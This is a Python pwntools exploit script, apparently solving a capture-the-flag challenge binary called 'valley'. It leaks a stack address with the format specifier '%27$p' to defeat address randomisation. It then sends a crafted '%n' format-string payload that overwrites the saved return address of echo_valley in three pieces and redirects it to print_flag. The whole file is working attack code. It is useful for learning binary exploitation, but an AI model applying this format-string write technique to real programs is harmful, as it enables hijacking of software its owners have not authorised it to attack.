#!/bin/python3 

from pwn import *
import math

context.arch = "amd64"
# context.log_level = "DEBUG"

gdb_script = """
b *main
b *echo_valley
"""

elf = ELF("./valley")
p = process("./valley")

# gdb.attach(p, gdb_script)

p.sendlineafter(b"Shouting:", b"%27$p")
p.recvuntil(b"You heard in the distance: ")

main_addr = int(p.recv().decode("latin-1").split(":")[-1].strip(), 16)
offset = main_addr - elf.symbols["main"] 

flag_addr = offset + elf.symbols["print_flag"]
ret_addr = offset + 0x1413

# log.info(f"offset: {offset}")
log.info(f"print_flag address: {hex(flag_addr)}")
log.info(f"echo_valley ret address: {hex(ret_addr)}")
# log.info(f"puts address: {hex(puts_addr)}")
print()

split_addr = [
    int(hex(flag_addr)[-4: ], 16),
    int(hex(flag_addr)[-8: -4], 16),
    int(hex(flag_addr)[: -8], 16),
]

payload = b"".join([
    p64(ret_addr),
    p64(ret_addr+2),
    p64(ret_addr+4),
    b"%", str(split_addr[0]).encode(), b"x%6$n",
    b"%", str(split_addr[1]).encode(), b"x%7$n",
    b"%", str(split_addr[2]).encode(), b"x%8$n",
])

p.sendline(payload)
print(p.recv().decode('latin-1').split(":")[-1])
p.sendline(b"exit")
print(p.recv())
